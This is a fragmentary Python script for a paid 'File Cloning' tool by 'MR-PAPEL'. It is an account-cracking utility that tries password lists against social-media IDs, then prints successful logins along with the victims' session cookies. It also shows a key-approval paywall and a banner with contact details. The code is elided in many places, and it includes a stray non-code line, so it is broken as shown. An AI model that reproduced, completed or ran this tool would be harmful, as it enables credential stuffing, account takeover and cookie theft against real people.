...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mPapel')
...
os.system('espeak -a 300 " Welcome,   to,  MR,  PAPEL, File, Cloning,Tools"')
#os.system('xdg-open https://www.facebook.com/Papel.King.Ok.Bro')
def banner():
	os.system("clear")
...
║\033[0;91m /$$$$$$$   /$$$$$$  /$$$$$$$  /$$$$$$$$ /$$                                              ║
║\033[0;91m /$$$$$$$   /$$$$$$  /$$$$$$$  /$$$$$$$$ /$$                                             ║  
║\033[0;91m | $$__  $$ /$$__  $$| $$__  $$| $$_____/| $$                                                       ║
║\033[0;91m | $$  \ $$| $$  \ $$| $$  \ $$| $$      | $$                                                               ║
║\033[0;91m | $$$$$$$/| $$$$$$$$| $$$$$$$/| $$$$$   | $$                                               ║
║\033[0;91m | $$____/ | $$__  $$| $$____/ | $$__/   | $$                                                           ║
║\033[0;91m | $$      | $$  | $$| $$      | $$      | $$                                                                      ║
║\033[0;91m | $$      | $$  | $$| $$      | $$$$$$$$| $$$$$$$$                                                 ║
║\033[0;91m |__/      |__/  |__/|__/      |________/|________/                                                         ║
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ WORKING ONLY MOBILE DATA ]         \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-PAPEL ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • MR Papel ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mMR-NOOB HACKR]   ║\33[1;34m   
╠══[Whatsapp                 • 01643975944 ]  ║\33[1;35m 
╠══[TOOLS                    • PAID  ]        ║ \33[1;32m   
╠══[VERSION                  • 0.0 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	PAPELj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	PAPELj('\033[0;97m===============================================')
	PAPEL= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if PAPEL in ['m']:
		public()
	elif PAPEL in ['1']:
		crack_file()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[Papel-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				Papel-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Papel-Cp] {idf} • {pw}')     
				...
				#Tutul-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Papel-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/File-CloningApproval/MR-PAPEL-/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m MR PAPEL FILE CLONING, ToOLs Daily Update")
		print('\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m free fire id Cloning')
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+Papel+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Papel+''+key1
